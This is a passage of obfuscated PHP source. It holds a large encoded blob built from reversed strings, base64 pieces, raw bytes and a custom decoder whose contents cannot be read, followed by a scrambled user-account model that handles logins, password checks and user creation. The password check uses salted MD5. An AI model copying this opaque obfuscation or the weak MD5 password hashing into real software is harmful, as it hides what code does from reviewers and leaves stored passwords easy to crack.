trrev('\' ]ɠ&4^N	UhvZ5<.ykt'."\n".'.').base64_decode('trahI2P29DOgFyf4UIa9ZbhE1qGugiNKFOYkkippBXaDRc7FRjAqjoS6QnFPX7RL8NDAQCGibIM=').strrev('K5\'U޻^*Jә*ZU%1Iy	ĲY-d%1ܰ8`').strrev('D=&j@#`+c^?KjMn=^GIX}').base64_decode('noVM5cSnFKnQ7C17ARhpyYzmc3OYDo5wKjrX11LUtWJaLaQkgFMwWnytVT7P4paqNpAk53IwVXI=').strrev('(R}`'."\r".'$Põ]=e>O$>}ypB`0pb2Dsuͷ').strrev(',k4f$aWᗂ}p<[DlHmN#4?> D2&PhK'."\r".'')."\xe9\x2c\x57\x46\x31\xc9\x5\x2c\x82\xc3\xda\xa5\xdc\x70\xdd\x71\xe2\x17\xd5\x35\x7d\xc\x66\xb6\xa1\x55\xfc\x28\x55\x70\x42\xe6\xfb\xfc\x3a\x99\xdc\x52\x93\x59\x2e\x98\xf2\x72\x33\xe4\x4\x33\x4f\x0\x45\xa2\xfb\x3a\xdb\x40".strrev('6Tj8A.kJ\\ӆ3Wmz T(-#s{Uay؊h')."\x2b\xd1\xc2\xfd\x7a\x8b\xc4\x9e\xca\xe6\x14\x5b\x32\xd3\x84\x60\x17\xcb\xfa\x58\x8b\x54\xe1\xc9\xed\x5c\x45\xcd\x72\x13\x95\x48\x98\x58\x4f\xb4\xe2\xa4\x85\x86\x46\xa0\x6a\xad\xb3\x9a\x9b\xea\xea\x1c\xf9\x92\x61\x3a\x75\xc5".base64_decode('+vQp7CiJnB/2RJx4YjsXq4Af+KjJMnr5vEUiE8Eh0fmBQyFP1NvlkBCxOqT5/igA94F/sF6/Q4I=').base64_decode('8xokg3nukKDBsEPq68W/XCcb9B0mC2RRg7oSxCFFU6JxkyhJgjMWasKQXscAOqL5liVqobEBqmQ=').base64_decode('Y5shuE8nxAC4Y0kvtGAHQ4YzrybBqg5WVCcgiRaobmctg15k/t9LgLWgeuH/91KgdoTHBItMomQ=')."\x2a\xc6\x7f\x55\x6\x65\x70\xac\xab\xb0\x6\x51\x1b\x59\x15\xea\xa5\x86\xba\x3a\x29\xb8\x10\xa2\x91\x94\x49\x42\x2e\xda\xc9\x84\x17\xe0\xf1\x21\xab\x34\xd6\xc4\x48\xc9\xc3\xf4\x71\xd5\x2c\x9c\x64\x6a\xa1\x48\x3d\x2b\x22\x46"."\x5\x6\x3e\x2c\x3c\x3a\xaf\x59\x97\x83\xa8\x85\x5b\x93\x86\xa5\x28\xa7\x26\xa3\xd\x55\xda\x53\x70\x93\x1\xf2\x8e\xb1\x76\xc0\xb5\x7d\x58\x81\x69\xb4\xb3\x30\x26\x66\x65\xa9\x16\xf4\x15\xcc\xc5\x18\xd8\x82\x8\xa\xc4\x98".strrev('@'."\0".'[e|#f3#s4?0'."\n".''."\n".'FCaoZP낞4c(J`')."\xa\xb3\xb6\xa\x9a\x50\xb5\xd1\x59\xa1\x15\xe5\xa1\x92\xc2\xe0\x2d\xb6\x59\xc2\xda\x8c\x32\x31\x32\xb0\xf5\x18\xc5\xb2\x74\x2d\x23\x17\x5c\x24\x7c\xfb\xcc\x19\x45\xdf\xe0\xc\xa8\x80\x57\x88\x16\x9\xba\x32\x76\x2\x7e\x32"."\x5c\xc6\x92\xcb\x68\x1\xe\xe8\x84\x3c\x71\xc2\x45\xfc\x7b\x57\x56\xac\x70\x4b\x17\x56\x44\x6c\x38\xb8\xd4\xe9\x1f\x2d\x82\x3a\x2a\x29\xb0\x52\x83\xd\xfb\x98\xc5\x3a\xd7\xbd\x2\x1b\x60\xe0\x6b\xbb\xda\x1a\x27\xd\x30\xcf".strrev('lU1V47$`H#'."\r".':Zؠhުi0(i0eB')."\213\31\27\133\63\62\124\232\54\234\255\213\125\217\143\313\104\2\31\215\27\225\34\76\54\101\66\143\24\76\66\1\74\231\323\241\13\263\224\30\127\363\360\212\121\146\225\324\201\310\16\270\321\40\305\311"._kodDe('LXvZoUMDMYOq8lOquUdTATcR/RngBGlgX963zsajTxfGXWA33rqDNpskjcjCQQji9As/fquZunva')."\160\170\65\127\61\241\110\245\272\21\256\261\223\25\164\151\4\164\170\131\215\356\44\204\224\260\146\262\265\225\33\362\240\244\164\216\152\164\5\172\346\307\73\273\3\241\70\22\361\203\275\121\117\267\55\1"."\xf0\xcc\x68\xc0\x5b\x6\xee\x8\x52\xc7\xb1\xb6\x5a\x27\xf2\x56\x8d\x33\xb5\x80\x96\xf9\x10\x77\x80\x3\xa2\xb2\xc1\x1c\xa7\x12\x7f\x84\x24\xf\x54\xdf\xc7\xc1\x39\x73\x13\xba\x9b\xda\x24\x26\x84\xd\x8f\x91\x97\x73\x4c\xa1"."\xc9\x4d\x55\xca\xdd\x46\x89\x88\x8\xc4\x47\x4a\x77\x80\xcc\x1d\x37\xd9\xdf\x75\xab\x9\x6a\xab\xe3\xed\x5e\xe\x9a\x0\x5d\x59\x4\xc3\x9e\xf0\x32\xee\x22\x17\xa4\x44\x3d\xe1\x9\x52\x60\x1e\xe2\x89\x8e\x3a\x47\x9b\x33\x6f".strrev('jrTH\'\\HTYa,vLLrCxP/?2f<')."\46\73\116\23\34\327\314\44\277\243\344\67\61\116\310\132\326\211\356\100\122\46\371\125\203\234\217\145\306\241\352\33\15\203\225\46\307\317\61\221\336\357\200\344\225\13\323\114\51\10\320\346\110\75\320\146"."\xa8\x90\x91\xc6\x41\xcb\xb1\x4f\x64\x83\xbb\xdb\x30\xb2\x4a\x2e\x17\x87\x2a\x6f\xa4\xba\xc9\xac\x26\xd9\x37\x90\x34\x3a\xf1\x37\x78\x31\x4\x5c\xa2\xfa\x1a\x90\x79\x82\xa\x92\x49\x45\x66\xb2\x70\xdb\xcf\x9d\x4b\x10\x3\x3b"."\227\213\50\361\100\237\4\200\231\130\221\220\373\113\352\154\0\35\33\304\1\237\23\274\44\102\111\111\202\113\13\262\124\260\70\164\131\250\245\310\260\265\140\57\56\51\145\164\216\204\134\24\21\317\326\225"."\xbd\x2\xa1\xcf\x48\xe0\x33\xd0\x2a\x4b\xc2\xa6\xb0\x16\x5\x41\x8c\x50\x6\x69\xb1\xe8\x19\xe2\x84\xf2\xa\x4f\xad\xab\xaf\x13\xac\x2e\x2\x5e\x7f\x24\xbe\x20\x2\x1d\x6e\x76\x7\xa8\x83\x18\x6b\x42\x0\xa4\x45\xc3\x13\xa4".base64_decode('eMITpQQ7FkyQ4qX7B2tKdzAYEX0R2arXFxK8DJL9MVy76XMyvX3dhH/FCAXHCC/2EvWmWGlqXRM=')."\x35\xc8\xe1\x2f\x44\xc2\xbe\x89\xb\xef\x38\xe3\x23\x33\x1c\xd6\xd0\xe\xd\x87\xa5\xa4\x8c\xd\x57\x12\xa\x96\xa\x94\x14\xf4\x30\xa\x6b\x27\x19\x40\x56\xa6\x9c\xfc\x28\xe8\x3e\xd8\xed\xae\x76\x4d\xaf\x99\x72\x54\x5e\x84".base64_decode('xWohMFbrPqqPVOMoDgMIUxjcvaK6as20Gldtday+hqlvxai1VyxWIspPA6ub1nJnhrF+V21sYIo=')."\xa0\x4d\xb6\x1a\x0\xd6\x32\xc0\x48\x96\x9e\x87\x21\x1f\x11\xc\xcb\xa8\xad\xee\xaf\x9a\x36\xe0\xaa\xed\x5f\x11\x8b\xd\xc0\x60\xd\x80\xb5\x40\x78\x2c\xe2\xaa\xad\x71\xb4\x4f\x71\xf7\xa9\x86\x88\x8f\x5d\x32\x4f\x88\x43\xba".base64_decode('nNp7FdnhPhRZVLBLQtYOoj5tyA+YsuDwzcwXBbKFPsmam0TlcQyhS0qJrn0oSA2silyJ3qpMy6I=')."\226\331\122\47\165\0\121\315\142\167\154\361\112\47\324\116\237\56\24\24\27\175\61\42\210\370\172\7\214\13\17\222\12\165\5\362\232\340\76\5\26\104\335\13\21\101\100\66\262\23\370\333\301\256\57\100"."\3\204\72\41\326\342\202\33\176\141\241\355\262\371\215\42\333\250\362\76\304\141\100\310\144\152\41\74\360\51\264\257\241\36\101\270\116\370\110\202\364\0\354\343\270\355\203\314\174\71\47\154\107\271\16\14"."\x92\x26\xb8\x16\x16\x8d\x52\x11\x29\x29\x17\xe1\x7d\x4d\xa\x9f\x8c\x83\x8e\x27\xdf\x66\xa1\xbe\x10\xf4\xd6\x6\x39\x41\x9c\x9e\xa1\xa\xa0\x40\x6f\x20\x1e\x9\x2c\xf7\x97\x25\x40\xe7\xc2\x95\x53\xc0\x7a\x1f\xd\x50\xf1\x47"."\x80\xf7\x6\x91\x83\x34\xb\xbc\xaf\x77\x61\x6f\x70\x49\x25\xd4\x68\x4f\x88\xcb\x12\x42\x92\xd7\xd3\x1b\x8d\xb\x7b\x52\xbc\x59\x1\x5b\x2e\xb6\x5b\xa1\xa\xeb\x49\x3d\xd9\xd8\x90\x60\xd3\x8c\x39\xe\xa3\xb2\x3c\x99\x29\x74"."\315\347\316\10\106\235\114\177\237\356\167\174\334\207\10\311\206\16\136\111\25\220\107\25\222\101\74\305\21\223\35\122\305\63\34\266\241\322\345\202\221\126\164\333\361\144\102\55\310\324\75\152\236\176\73\317"."\x2c\xd6\xa0\x5b\x25\xea\x8a\x6\x59\x97\x51\xc9\x40\xbc\xbb\x2e\xb2\xb\x40\x62\xd2\xa5\x83\x54\x3d\x5\xed\x8f\x84\x33\xbb\x82\x19\x56\x32\x62\xb4\x5b\x63\x3a\x7b\x68\x35\xaf\x50\x4\x7c\x21\x47\x30\x23\x81\x9b\x14\x4f\xd2"."\54\211\57\361\10\57\220\203\230\360\32\274\140\112\347\254\227\130\213\342\270\144\34\231\56\44\140\115\361\12\346\170\66\257\2\310\276\25\117\136\350\255\267\20\51\45\230\307\30\233\375\34\365\101\52\211"."\x96\x6b\xd4\xcb\x28\x2c\x0\x3d\x1e\x3\x5b\x60\x88\x69\xa0\x58\xf8\x0\x31\x6f\x99\x98\x5\x7d\xb3\x2c\xb\x4e\x83\x6\x66\x9c\x95\x89\x29\x6\x54\xc8\xea\xa3\x62\x57\xa5\x94\xa\x9f\x42\x49\x42\x8f\x26\xe9\x3e\x8e\x2c\x45"."\xa4\x13\x97\xf1\xbe\x32\x69\x7f\x37\x38\xe9\xa3\x55\x9a\xe8\x3b\xe\x9b\xa7\x91\xce\x75\x36\x48\x2\x79\x41\xde\x23\x50\x4\x3e\x8d\x60\xdd\xc8\xd\x2e\x73\x1c\x47\x83\xde\x10\x4\x2b\x24\x6e\xd0\x87\x1f\x9b\x61\x43\x8b\x5e"."\xa5\x61\x31\x5d\x30\xf6\x52\x52\x74\xe8\xd0\xab\x2e\x15\xd7\x12\xc\x44\xcf\xbe\x54\x34\x87\xc2\x9d\x5\x93\x7d\x16\x5f\x94\x36\x4\x30\xe5\xad\xe9\xe4\x1d\x79\xa1\x32\xd6\xc\x3a\xf6\xcd\xe7\x53\xb8\xab\xe\x94\x85\xd7\x99"."\xbb\xf0\x4\x20\xd\xbf\x4c\x2f\x74\x2\xf7\xf0\x86\x9f\xac\xa1\x9e\x47\x3d\xa9\x94\x1d\x1c\xd5\x18\xb0\xdc\x4b\x9c\x8b\xf9\x4c\x25\x3e\xdb\xc1\x6\x34\x12\x8\xf6\x56\xd7\x40\x89\xca\x62\xa6\xdf\x33\xc6\xbc\x6a\x83\x51\x43"._kodDe('KGxhMoX9wDt7IF4/mQi5NLcjBQ+vV34eg7z//5jiya8Ang9seXEJezokDg05WOw3l5UYVoQdYS24')."\133\230\33\110\272\375\31\311\253\111\251\73\70\37\356\275\175\201\310\102\51\243\230\22\27\172\320\45\205\165\226\43\37\13\350\120\217\22\171\202\252\260\240\240\23\35\200\70\55\216\170\330\216\104\364\17"._kodDe('Mfj2GBd8BUWnKQleKoWTmA6E+vb3JlLcsWb4e823s/0E2YWZYnnS3RaNC6TfAjg4q2Dd2em1MQON').base64_decode('hlVD5VOedtWYiF/Wl6gpAgJ0y8Wtu1m3su+UWR3zOMYhT18J9q14SMS354TVAPoWAEst13UrUsc=')."\54\344\172\235\322\6\211\12\67\325\226\107\352\110\62\330\11\312\52\45\165\34\26\162\204\3\363\273\242\23\25\127\206\255\246\370\13\164\266\312\250\51\52\55\62\207\323\100\106\104\345\141\255\35\113\235".strrev('u@̍9vG~8RĦFCU+LUx\' ؽb')."\x91\xe0\xf6\xc7\x4d\x8f\x1c\x99\xab\x6a\x78\xf2\xec\xa7\x4e\x68\x5c\x26\xd\x41\x30\xb7\x2b\x85\x19\xe9\xf3\x55\xb4\xb2\x38\x6a\x77\xde\x9a\xb5\xc8\xc8\xe5\xb8\x20\x4d\xe2\xe6\xef\xc\x41\x6a\x95\xea\x90\x17\x5\xac\x4f\x83"."\356\167\346\122\267\364\260\361\330\44\31\75\341\345\317\27\115\213\271\162\227\152\360\347\45\220\230\300\267\103\120\366\322\362\143\145\0\213\75\174\67\255\6\363\57\12\315\110\12\151\115\154\31\142\131\176"."\300\32\34\50\204\315\240\35\360\244\332\14\41\42\350\126\206\25\153\366\11\313\62\354\274\236\361\151\13\143\104\21\201\216\220\375\251\340\236\235\376\102\117\63\114\276\204\125\21\4\21\142\265\24\43\277".base64_decode('lAfaiwZj4yVaIZQAYbQssUfhamikrg7O1vFtNABh/0UgwCmapgnDj9XRw9iboQs7p6ByR0ZlLks=')."\x2d\x68\x84\xdc\xc1\x16\x61\x42\x37\x2a\x64\x7d\xc3\x2e\x55\x4a\x85\x0\x76\x52\x6f\x81\xea\x82\x78\x2d\x7a\xba\xc5\xce\x63\xb8\x33\x71\x82\xe\xbe\x16\xc2\xde\x62\xc8\x84\x14\x8b\xa4\x4e\x79\xd0\xf\x14\xc0\x1\xbd\x32\x33"."\x66\x77\xb9\x13\x1f\xe8\x6d\x91\x89\xf\xdc\x3b\xe9\xa0\x86\xa4\x58\x97\x28\xff\x12\x4\x69\xae\x44\xe7\x8b\x61\x5a\xe8\x8\x8a\x1c\x40\x1a\x71\xa0\x0\x22\x4e\x51\x48\xaa\xc\xb5\x10\x27\x42\x61\x3\x86\x5e\x16\x64\x63\x7"."\x7b\x94\xfc\xf8\x94\x34\x13\x1f\x61\x9c\xef\x33\xc4\x67\x38\x68\x13\x30\x61\x94\x7d\x3\xfd\xc2\x4d\xb4\x3\xb7\xd1\xc1\xc8\x45\x35\xba\x91\x7a\xa1\x11\xc1\x2\x96\x83\xfb\x83\x77\xe0\xb3\x79\x64\xc4\xc2\x99\x3\xef\xe\x4a"."\366\31\205\177\20\326\60\52\176\334\42\311\331\205\70\326\113\266\14\141\173\117\106\265\162\337\7\334\153\121\241\224\347\356\241\100\304\52\300\142\321\236\172\215\370\236\346\226\364\234\3\251\306\72\350\343"."\164\16\374\16\252\303\122\4\252\120\334\24\32\314\244\51\333\160\225\175\354\107\224\116\174\331\42\201\26\210\6\330\231\4\116\152\101\27\33\225\321\124\13\135\202\335\43\77\62\306\157\127\26\355\214\162".base64_decode('WT7V0Dhjtrhf5MPIfdSQo3yi5UOPxhhhSFY6k+iDmeLMRolWl7zkPVWBC9r414+aDp5K4ibOJJw=').base64_decode('YLGShS6o9JX/ez2szsrIPtDHZExBMBRFWNDjHjaHzGywkBuzNwu/+vjjK0YlOdnqxwql8kURsgg=').base64_decode('vG4KACFIayWL01I4wFDMIDSZJ6Mr7BtAigVNWAtBjK3w/AUpWDH6tYkE/TJHs3TG8gYgz/fcEwc=')."\x22\x4e\xb\xa1\xa\x2f\xb0\x8a\x8e\xe4\x51\x41\x51\xc1\xdf\x5f\x79\xd1\x68\xef\x49\xaa\x4d\x28\x15\x5d\xd2\x23\xbf\x72\x9e\xf9\xec\x6d\x0\x78\x81\xc9\xab\x0\x63\x9c\x3d\x99\x1a\x4f\x31\x5\xaf\xf5\x90\xa1\x5\xe9\x69\x1d"."\330\274\132\104\131\20\347\326\116\302\174\113\331\200\242\354\41\314\137\60\257\124\101\34\45\162\32\27\174\120\103\5\137\101\144\173\314\173\312\103\46\152\312\41\276\73\13\242\214\16\311\112\102\146\74\162"."\23\214\77\53\254\33\174\211\340\241\136\152\20\0\43\302\101\20\22\37\131\142\126\224\54\341\63\110\126\141\212\325\2\161\267\112\123\2\127\2\322\43\131\274\120\220\162\124\250\61\214\14\165\141\36\322".base64_decode('e1YOgRr0PSsgLI65qRaWU5Fj7yWmEjJyWGIkwuU4pGwtXByhOHM1Sh+wou9aycwLDHRvwzZP+GA=')."\211\240\344\162\174\165\20\37\54\311\45\144\335\5\310\151\320\244\56\301\52\105\304\167\0\52\310\374\124\356\340\15\50\250\311\301\12\56\200\140\147\103\105\34\201\61\13\313\131\31\32\347\43\140\325\143"."\12\164\64\204\4\144\50\10\221\127\276\55\257\104\4\331\305\162\15\161\37\67\60\217\316\176\70\345\350\211\225\70\361\55\240\62\166\21\265\254\20\26\240\330\75\204\10\240\33\170\112\17\226\34\320\331"."\120\207\40\151\143\44\103\354\133\313\103\27\345\36\241\312\163\263\11\50\146\341\13\10\216\303\107\271\255\133\130\261\150\174\31\14\267\151\141\270\243\162\331\212\147\63\246\342\54\121\15\174\360\47\356\66"."\x40\x48\xac\x28\x9d\x66\x21\x5d\x43\x6b\xbe\x15\xca\x56\x5\xc1\x28\x49\x50\x18\x8a\xd8\x19\x95\xa9\x59\xfa\x8\x88\xe8\xc2\xa1\x3c\x7e\x1\x12\x3f\xb9\xd\x9f\xaf\x3\xec\x4a\x8a\xf4\xf5\x54\x23\x7f\xde\x10\x0\x3\xf8\x15".base64_decode('sZVEBFkpTZKE//BbctUwGRayUgr08td8ayT+Bpr4rjc8terUGB1YnyOAvoKtRN9WCS2p6YaAJjw=')."\245\264\10\72\126\307\301\36\265\100\137\301\40\264\114\263\223\256\307\261\112\345\203\221\216\230\226\61\341\357\232\333\337\63\107\233\72\274\117\263\154\327\210\142\216\10\22\16\226\240\366\271\325\371\52\112".base64_decode('RGD6TCQpQTgdt95TsAetyxhVSe0WklEu+joZ+IUvFQS4ewaUjM/zPMMyU1qx5+qzyLzCrUYSUSA=').base64_decode('35igjAlQS/SPp6jac5hZVU91qIWUHb9USDAoRweD0VEJDGQpzqttcGFZ4dxSHuan3lwKTaU65eE=')."\12\250\314\230\232\101\1\204\241\42\121\107\170\120\205\173\355\125\106\304\257\23\274\164\371\242\2\21\313\241\374\301\25\173\273\320\274\141\160\162\321\120\20\134\252\21\162\343\40\374\340\75\363\231\207\213".strrev('fwt)ZU"Kjsjt 11}i?lzgqNQ5')."\x88\x54\xfe\x8\xa7\x57\x6b\x17\x47\x6c\x37\x2c\x36\x16\xca\x91\xe9\xca\xa6\x59\x6\x44\x60\xb0\xac\xb1\x4\x33\x2c\x26\x5a\xaa\x68\x1f\x6e\xb4\xb1\xe0\xb4\x8a\x81\x79\x74\xa2\x85\xd3\x3c\xd6\x24\x8c\xaf\xd8\x5a\x24\x66\xb0"."\267\26\347\320\313\372\214\344\251\374\151\373\7\150\227\331\157\32\171\41\302\236\246\354\32\64\252\125\310\203\153\124\61\33\116\202\71\271\350\146\311\153\214\250\146\62\133\61\57\116\202\171\313\222\151\146"."\x61\xb\x2e\xe4\x33\xe5\x92\x31\x41\xf3\xca\x3b\xf\x4d\x2d\x5b\xd7\x91\x6\x73\x8f\xdf\x2\xea\x44\xfd\x59\x11\xb9\xfc\x73\x84\x78\xec\xd8\x68\x5b\x5d\xb9\x16\x15\x8f\x0\x26\xaa\x45\x45\xe4\x9\x6b\xc1\xb1\x6d\x37\x9e\x95"."\x78\x24\x4d\xa9\xc0\x15\xf9\x5\x65\x39\xff\xe5\x69\x15\xae\x4b\x71\x99\x70\x71\xe\x5b\xb4\x7\xcb\x92\xc5\xbb\xd7\xca\xb7\xb3\xe1\x8a\xb3\xd8\xb0\x5e\x9b\xda\xe0\x62\xc7\x50\x3d\x90\x2d\xeb\x4e\xdc\xb6\xf1\xec\x40\x48\xa2".base64_decode('ARFs4dqlwmCBOlgCX+COC6ERpUe39x+VAW3ueil5FkqCi9iK/n4dcGNcvvPMUfdbojdkvGPRTDU=')."\51\150\155\100\240\350\320\27\247\323\217\344\370\301\31\21\40\360\145\234\117\124\102\106\265\125\341\133\361\354\302\323\162\273\127\41\335\305\17\122\55\356\242\321\233\143\314\260\34\257\350\344\50\31\137\174"."\x20\x5\x1b\x2\xe9\x18\x83\x1b\x2e\x7\x5e\x28\x71\x72\x44\xd3\x4d\x68\x70\xe\x98\x79\x11\xfd\x76\x68\xa6\x49\x79\xc\x10\x8b\x11\x26\x92\xfb\x90\x3f\x1b\xe1\x3a\x17\x84\xf8\xa3\xae\xb0\x6f\xd1\x29\x36\x22\x54\xc4\x50\x50"."\220\134\301\300\315\151\104\301\251\210\15\131\42\360\164\234\105\302\345\307\340\235\45\333\235\17\7\200\155\145\102\33\45\104\200\236\213\341\365\201\307\330\244\133\354\262\35\177\162\200\120\241\170\71\215\64".strrev('X}	,RYH"\':5p~ J,M'."\n".'{$cdI*\'qqN7')."\3\265\54\31\345\22\64\1\312\222\102\135\301\336\211\322\374\75\236\100\167\131\32\324\14\200\172\261\364\331\113\234\24\10\241\132\172\272\273\251\32\132\171\55\2\336\205\274\46\350\102\214\37\337\26\263".strrev('6p'."\r".'S'."\n".'KߓxXYYgnC\';<,kld	Lȩ'."\r".'=')."\x99\x28\x8c\x1a\x27\xaa\x4\xf1\xeb\x3f\x97\xe5\x9a\x50\x80\xa3\x89\x83\x98\x90\x40\x90\xe2\x1a\x8c\x0\x44\x85\xd5\x76\x4d\x63\xeb\xcc\xf9\xb6\x3\x59\xcb\x45\x1f\x82\xf0\xe\x81\xf5\x5e\x40\x1d\x3f\xac\xd2\x12\xc2\xdd\xf".base64_decode('5lMWDiXqYuCwjYGlolpUzhC+AqUSHusYE8PiwUcbYyumnKG37XZWLFwvw176/3u1b/PEwgAA')."", 10, -8))); goto fӔ; CбЙ: class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\141\x6d\145" => "\165\x73\x65\162\x5f\x6d\x65\164\141", "\155\x65\164\x61\x46\x69\x65\x6c\x64" => "\x75\x73\145\x72\x49\x44"); protected $simpleField = "\x75\x73\x65\162\111\x44\54\x6e\x69\x63\153\116\x61\155\145\x2c\156\x61\155\145\x2c\141\x76\141\164\141\x72\x2c\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($C촨) { $Dԗר =& $_SERVER[ԥ]; $eר = $Dԗר[2452]; return array($Dԗר[2132] => array($C촨[0], $eר), $Dԗר[2134] => array($C촨[0], $eר), $Dԗר[2453] => array($C촨[0], $eר)); } protected function getInfo($bۏͫ, $e = false) { $C֙ = $this->getInfoSimple($bۏͫ); if (!is_array($C֙)) { return array(); } if ($e) { return $this->_getInfoApply($C֙); } return $this->cacheFunctionGet($_SERVER[ԥ][2174], $bۏͫ); } protected function getInfoFull($c, $E՜ = false) { $dȪ = $this->getInfoSimple($c); if (!is_array($dȪ)) { return array(); } if ($E՜) { return $this->_getInfoApply($dȪ, !0); return $this->_getInfoApply($dȪ, !0); } return $this->cacheFunctionGet($_SERVER[ԥ][2454], $c); } private function _getInfoApply($E̋, $bؼ = false) { goto C͔; B: $E̋[$DŽ[387]][$DŽ[2290]] = isset($Aߎ[$DŽ[2291]]) ? $Aߎ[$DŽ[2291]] : null; if ($bؼ) { $E̋[$DŽ[413]] = $this->metaGet($E̋[$DŽ[1404]]); } return $E̋; goto aܵ; a鍮: $E̋ = $this->_listDataApplyItem($E̋); $Aߎ = Model($DŽ[1093])->metaGet($E̋[$DŽ[387]][$DŽ[365]]); $E̋[$DŽ[2457]] = $aӒԴ; goto B; C͔: $DŽ =& $_SERVER[ԥ]; if (!$E̋) { return $E̋; } $aӒԴ = md5($DŽ[2455] . $E̋[$DŽ[787]] . $DŽ[2456] . $E̋[$DŽ[28]]); goto a鍮; aܵ: } protected function getInfoSimple($aƔ, $Aǈ = false) { $d =& $_SERVER[ԥ]; if (!$aƔ) { return array(); } if ($Aǈ) { $bĤґ = $this->where(array($d[1404] => intval($aƔ)))->find(); if (!is_array($bĤґ)) { return array(); } $bĤґ[$d[2458]] = Action($d[2459])->parseUrl($bĤґ[$d[2458]]); return $bĤґ; } return $this->cacheFunctionGet($d[2135], $aƔ); } protected function getInfoSimpleOuter($cÒ̶) { goto f땟х; bמΩ: return $CН; goto F˺ф; f땟х: $Bќۍ =& $_SERVER[ԥ]; if (!$cÒ̶ || $cÒ̶ == 0) { return array($Bќۍ[1404] => $Bќۍ[464], $Bќۍ[28] => $Bќۍ[153] . LNG($Bќۍ[2460]) . $Bќۍ[472], $Bќۍ[2458] => STATIC_PATH . $Bќۍ[2461]); } $a鎐܄ = $this->cacheFunctionGet($Bќۍ[2135], $cÒ̶); goto Bٽ; Bٽ: $CН = array_field_key($a鎐܄, explode($Bќۍ[47], $this->simpleField)); if (!$CН) { return array($Bќۍ[1404] => $Bќۍ[1014], $Bќۍ[28] => $Bќۍ[153] . LNG($Bќۍ[2462]) . $Bќۍ[472], $Bќۍ[2458] => STATIC_PATH . $Bќۍ[2463]); } $CН[$Bќۍ[2458]] = Action($Bќۍ[2459])->parseUrl($CН[$Bќۍ[2458]]); goto bמΩ; F˺ф: } protected function groupUser($B譊ܬ) { } public static function errorLang($Dэׅ) { $AƘ =& $_SERVER[ԥ]; $d = array(self::ERROR_USER_NOT_EXISTS => $AƘ[2464], self::ERROR_USER_PASSWORD_ERROR => $AƘ[2465], self::ERROR_USER_EXIST_NAME => $AƘ[2466], self::ERROR_USER_EXIST_PHONE => $AƘ[2467], self::ERROR_USER_EXIST_EMAIL => $AƘ[2468], self::ERROR_USER_LOGIN_LOCK => $AƘ[2469], self::ERROR_IP_NOT_ALLOW => $AƘ[2470], self::ERROR_USER_EXIST_NICKNAME => $AƘ[2471]); return LNG($d[$Dэׅ]); } public function getInfoByMeta($f, $DԄ) { $B =& $_SERVER[ԥ]; $cĔ = Model($B[2472])->where(array($B[89] => $f, $B[355] => $DԄ))->find(); if ($cĔ) { return $this->getInfo($cĔ[$B[1404]]); } return !1; } public function userLoginCheck($fȅ, $bз) { goto c; c: $fԳ =& $_SERVER[ԥ]; $DЄ = array($fԳ[28] => $fȅ, $fԳ[2294] => $fȅ, $fԳ[289] => $fȅ, $fԳ[2473] => $fȅ, $fԳ[899] => $fԳ[901]); if ($this->nickNameRpt()) { unset($DЄ[$fԳ[2294]]); } goto CيÎ; CيÎ: $F޷ = $this->where($DЄ)->find(); if (!$F޷) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($F޷[$fԳ[1404]], $bз)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto aĆ; aĆ: $this->userEdit($F޷[$fԳ[1404]], array($fԳ[2474] => time())); $this->clearCache($F޷[$fԳ[1404]]); return $this->getInfo($F޷[$fԳ[1404]]); goto Cӕ; Cӕ: } public function clearCache($BǍ) { $D =& $_SERVER[ԥ]; $this->cacheFunctionClear($D[2174], $BǍ); $this->cacheFunctionClear($D[2135], $BǍ); } public function userPasswordCheck($aɤ, $Aߘ) { $d߬ =& $_SERVER[ԥ]; $EݎЕ = $this->where(array($d߬[1404] => intval($aɤ)))->find(); $D = $this->metaGet($aɤ); $D = isset($D[$d߬[2475]]) ? $D[$d߬[2475]] : $d߬[33]; if (md5($D . trim($Aߘ)) !== $EݎЕ[$d߬[787]]) { return !1; } return !0; } public function userAdd($cé) { goto B멈; Fǋ: $A = array($eɓ[2484] => $EȲӪ̈́[$eɓ[787]], $eɓ[2480] => $EȲӪ̈́[$eɓ[2294]]); $this->userEdit($CՖ, $A); Model($eɓ[1093])->userRootAdd($CՖ); goto B؝; B؝: return $CՖ; goto FӚ; b؞뜋: $E뉦Ä = $this->_checkExist($cé); if ($E뉦Ä !== !0) { return $E뉦Ä; } $CՖ = $this->add($EȲӪ̈́); goto Fǋ; B멈: $eɓ =& $_SERVER[ԥ]; $EȲӪ̈́ = array($eɓ[382] => $cé[$eɓ[28]], $eɓ[2476] => $cé[$eɓ[2477]], $eɓ[2478] => isset($cé[$eɓ[289]]) ? $cé[$eɓ[289]] : $eɓ[33], $eɓ[2479] => isset($cé[$eɓ[2473]]) ? $cé[$eɓ[2473]] : $eɓ[33], $eɓ[2480] => isset($cé[$eɓ[2294]]) ? $cé[$eɓ[2294]] : $cé[$eɓ[28]], $eɓ[2481] => isset($cé[$eɓ[2458]]) ? $cé[$eɓ[2458]] : $eɓ[33], $eɓ[2482] => isset($cé[$eɓ[2483]]) ? $cé[$eɓ[2483]] : 1, $eɓ[2484] => $cé[$eɓ[787]], $eɓ[2136] => isset($cé[$eɓ[2050]]) ? $cé[$eɓ[2050]] : 1024 * 1024 * 20, $eɓ[2137] => 0, $eɓ[2474] => 0, $eɓ[2161] => isset($cé[$eɓ[673]]) ? $cé[$eɓ[673]] : 1); if (!empty($cé[$eɓ[1404]])) { $EȲӪ̈́[$eɓ[1404]] = $cé[$eɓ[1404]]; } goto b؞뜋; FӚ: } protected function userEditTest($Eȑ, $c䧈) { return $this->call($_SERVER[ԥ][2485], $Eȑ, $c䧈); } protected function userEdit($FŸ, $f) { goto eޖ; eۮ㒍: $eأ = $this->_checkExist($f, $FŸ); if ($eأ !== !0) { return $eأ; } if (isset($f[$D虾[787]]) && trim($f[$D虾[787]]) != $D虾[33]) { $bɔ = $this->metaGet($FŸ); if (empty($bɔ[$D虾[2475]])) { $bɔ[$D虾[2475]] = rand_string(10); Model($D虾[470])->metaSet($FŸ, $D虾[2475], 